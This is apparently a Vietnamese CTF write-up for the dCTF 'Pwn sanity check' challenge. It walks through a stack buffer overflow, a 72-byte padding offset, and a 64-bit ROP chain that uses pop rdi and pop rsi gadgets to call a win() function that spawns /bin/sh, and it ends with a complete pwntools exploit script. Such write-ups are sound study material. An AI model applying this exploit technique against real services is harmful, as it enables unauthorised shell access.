![pinch_me](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\pinch_me.png)

Dùng ida và thấy 4 hàm ![funcs](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\funcs.png)

Hàm **main** set alarm 10s thì đóng program và gọi hàm **vuln()** ![main](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\main.png)

Useless **shell()** func:

![bof](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\bof.png)

hàm **vuln** có `fgets` nên ta có thể bof đến hàm **win** đc

bạn có thể dễ dàng tìm đc padding = 'A' * 72

Pseudocode: 

```c
int __fastcall win(int arg0, int arg1)
{
  int result;
  result = puts("you made it to win land, no free handouts this time, try harder");
  if ( arg0 == 0xDEADBEEF )
  {
    result = puts("one down, one to go!");
    if ( arg1 == 0x1337C0DE )
    {
      puts("2/2 bro good job");
      system("/bin/sh");		// your target
      exit(0);
    }
  }
  return result;
}
```

Vậy payload = 'A' * 72 + win_addr + ret_addr +'\xef\xbe\xad\xde' + '\xde\xc0\x37\x13'. Nếu là file 32b thì payload là thế, nhưng đây là file 64b- 2 arg ko đc lấy từ stack mà từ 2 registers **rdi** và **rsi** 

![64](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\64.png)

Mình sẽ dùng ROPgadget để tìm code asm có pop rdi; pop rsi để đẩy 2 arg từ stack vào rdi và rsi

![rop](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\rop.png)

--> **payload = 'A'*72 + pop_rdi_ret + '\xef\xbe\xad\xde' + pop_rsi_r15_ret  + '\xde\xc0\x37\x13'+'\x00'  + win_addr**. Mình thêm '\x00' do sau khi pop rsi thì ta còn pop r15 nữa nếu ko sẽ đẩy win_addr khỏi stack vào r15 là khỏi chơi

Ban có thể dùng pwndbg để xem code và stack [nói dông dài ko = vứt cái ảnh trực quan]

![gdb](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\gdb.png)

```python
# xpl.py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

exe = './pwn_sanity_check'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

win_addr = elf.symbols.win
pop_rdi_ret = 0x0000000000400813
pop_rsi_r15_ret = 0x0000000000400811

io = start()
payload = flat({
    72: [
        pop_rdi_ret,
        0xdeadbeef,
        pop_rsi_r15_ret,
        0x1337c0de,
        0x0,
        win_addr
        ]
})

write('payload1', payload)
io.sendlineafter("tell me a joke\n", payload)
```

![flag](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pwn sanity check\imgs\flag.png)

